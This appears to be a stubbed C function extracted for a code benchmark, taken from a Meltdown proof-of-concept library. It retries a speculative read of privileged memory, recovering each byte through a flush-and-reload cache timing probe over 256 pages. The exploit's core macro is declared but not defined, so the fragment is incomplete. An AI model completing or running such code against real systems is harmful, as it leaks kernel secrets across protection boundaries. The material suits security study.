#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  uint64_t ;
struct TYPE_2__ {int retries; } ;

/* Variables and functions */
 int /*<<< orphan*/  MELTDOWN ; 
 int /*<<< orphan*/  buf ; 
 TYPE_1__ config ; 
 scalar_t__ flush_reload (scalar_t__) ; 
 scalar_t__ mem ; 
 int /*<<< orphan*/  sched_yield () ; 
 int /*<<< orphan*/  setjmp (int /*<<< orphan*/ ) ; 

int __attribute__((optimize("-Os"), noinline)) libkdump_read_signal_handler() {
  size_t retries = config.retries + 1;
  uint64_t start = 0, end = 0;

  while (retries--) {
    if (!setjmp(buf)) {
      MELTDOWN;
    }

    int i;
    for (i = 0; i < 256; i++) {
      if (flush_reload(mem + i * 4096)) {
        if (i >= 1) {
          return i;
        }
      }
      sched_yield();
    }
    sched_yield();
  }
  return 0;
}